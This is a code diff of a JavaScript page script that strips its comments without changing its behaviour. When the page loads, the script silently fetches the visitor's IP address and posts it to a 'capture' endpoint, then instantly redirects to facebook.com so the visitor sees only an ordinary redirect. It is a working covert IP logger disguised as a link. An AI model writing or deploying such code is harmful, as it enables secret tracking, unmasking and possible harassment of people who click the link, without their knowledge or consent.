@@ -1,4 +1,3 @@
-// Function to get the user's IP address
 function getIpAddress() {
   return fetch('https://api.ipify.org?format=json')
     .then(response => response.json())
@@ -9,7 +8,6 @@ function getIpAddress() {
     });
 }
 
-// Redirect and capture on page load
 window.onload = function() {
   getIpAddress().then(ip => {
     fetch('/.netlify/functions/capture', {
@@ -18,10 +16,10 @@ window.onload = function() {
       body: JSON.stringify({ ip })
     })
     .then(response => {
-      window.location.href = 'https://www.facebook.com'; // Instant redirect
+      window.location.href = 'https://www.facebook.com';
     })
     .catch(() => {
-      window.location.href = 'https://www.facebook.com'; // Fallback
+      window.location.href = 'https://www.facebook.com';
     });
   });
 };
